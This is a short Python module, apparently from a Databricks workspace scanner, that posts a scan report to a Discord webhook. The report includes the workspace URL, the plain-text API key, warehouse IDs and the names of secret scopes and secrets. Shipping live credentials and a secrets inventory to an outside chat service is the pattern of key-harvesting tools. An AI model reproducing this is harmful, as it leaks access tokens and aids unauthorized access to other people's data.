import requests
from rich.console import Console

console = Console()

DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

def send_discord_notification(report):
    if not DISCORD_WEBHOOK_URL:
        console.print("[bold red]Discord webhook URL not configured.[/]")
        return

    payload = {
        "content": f"Databricks Scan Report for workspace: {report['workspace']}",
        "embeds": [
            {
                "title": "Databricks Scan Report",
                "description": f"workspace: {report['workspace']}\nAPI Key: {report['apikey']}",
                "fields": [
                    {
                        "name": "Warehouses",
                        "value": "\n".join([f"{wh['name']} (ID: {wh['id']})" for wh in report['warehouse_info']]),
                        "inline": False
                    },
                    {
                        "name": "Scopes and Secrets",
                        "value": "\n".join([f"{scope}: {', '.join(secrets)}" for scope, secrets in report['scopes_and_secrets'].items()]),
                        "inline": False
                    }
                ]
            }
        ]
    }

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        console.print(f"[bold green]Report sent to Discord successfully![/]")
    else:
        console.print(f"[bold red]Failed to send report to Discord. Status code: {response.status_code}[/]")
